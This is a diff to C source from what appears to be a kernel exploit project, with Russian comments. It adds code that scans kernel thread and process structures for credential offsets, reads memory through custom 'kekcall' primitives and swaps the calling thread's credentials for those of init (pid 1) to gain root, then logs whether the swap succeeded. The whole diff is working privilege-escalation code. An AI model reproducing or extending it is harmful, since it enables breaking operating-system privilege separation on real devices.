@@ -876,7 +876,16 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
         dedicated_mp4_cdev = mp4_cdev_nodes[mp4_count - 1];
     }
 
-    /* ТЕСТ ПЕРВЫЙ: Верификация работы SWAP_BY_UCRED (KEKCALL 30) */
+    /* ТЕСТ ПЕРВЫЙ: Сканирование offset'ов td_ucred / p_ucred (KEKCALL 31) */
+    klog_printf("[TEST0] === SCAN_TD_UCRED: scanning struct thread/proc for ucred offsets ===\n");
+    uint64_t scan_result[2] = {0};
+    long scan_ret = kekcall(KEKCALL_SCAN_TD_UCRED, (uintptr_t)scan_result, 0, 0);
+    uint32_t empirical_td_off = (uint32_t)(scan_result[0] & 0xFFFFFFFF);
+    uint32_t empirical_p_off  = (uint32_t)(scan_result[1] & 0xFFFFFFFF);
+    klog_printf("[TEST0] SCAN ret=%ld td_ucred_off=0x%x p_ucred_off=0x%x\n",
+                scan_ret, empirical_td_off, empirical_p_off);
+
+    /* ТЕСТ ВТОРОЙ: Верификация работы SWAP_BY_UCRED (KEKCALL 30) */
     klog_printf("[TEST1] === Verifying KEKCALL_SWAP_BY_UCRED (nr 30) direct pointer swap ===\n");
     uint64_t my_td = 0;
     uint64_t ext_check[4] = {0};
@@ -884,7 +893,16 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
     my_td = ext_check[1];  /* curthread VA */
 
     uint64_t ucred_before = 0, ucred_after = 0;
+    /* Читаем текущий ucred через оба кандидатных offset'а для сравнения */
     kekcall(KEKCALL_DUMP_MEM, my_td + 0x140ULL, (uintptr_t)&ucred_before, 8);
+    uint64_t ucred_before_emp = 0;
+    if (empirical_td_off)
+        kekcall(KEKCALL_DUMP_MEM, my_td + (uint64_t)empirical_td_off, (uintptr_t)&ucred_before_emp, 8);
+    klog_printf("[TEST1] my_td=0x%llx ucred@0x140=0x%llx ucred@0x%x=0x%llx\n",
+                (unsigned long long)my_td,
+                (unsigned long long)ucred_before,
+                empirical_td_off, (unsigned long long)ucred_before_emp);
+
     uint64_t init_target_ucred = g_cand_ucreds[0]; /* pid=1 ucred */
     
     uint64_t swap_bkp[4] = {0};
@@ -896,6 +914,7 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
                 swap_ret, (unsigned long long)ucred_before, (unsigned long long)ucred_after,
                 (unsigned long long)init_target_ucred,
                 (ucred_after == init_target_ucred && init_target_ucred != 0) ? "CONFIRMED_WORKING" : "SWAP_FAILED");
+
 
     /* ТЕСТ ВТОРОЙ: Dump cdevsw mp4/dump_for_decid */
     if (dedicated_mp4_csw) {
